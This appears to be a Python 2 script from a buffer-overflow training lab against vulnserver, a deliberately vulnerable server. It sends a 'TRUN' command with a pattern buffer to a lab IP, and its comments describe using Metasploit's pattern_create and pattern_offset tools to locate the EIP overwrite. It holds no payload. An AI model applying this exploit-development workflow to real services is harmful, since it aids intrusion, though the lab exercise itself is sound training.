#!/usr/bin/python
#Fuzzing program for vulnserver target
import sys, socket

#offset generated from kali command /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
#3000 byte paramter determined by crash point from fuzzer1.py
offset = ""

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('169.254.215.29', 9999)) #target windows Machine IP address and vulnserver port
	s.send(('TRUN /.:/' + offset))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()

    #Using the character set that ends up in the EIP as observed in the debugger, we command
    #input the pattern into the kali command below and identify the exact offset:
    #root@kali:~/vulnserver# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
    # where '386F4337' is the character set found in the EIP
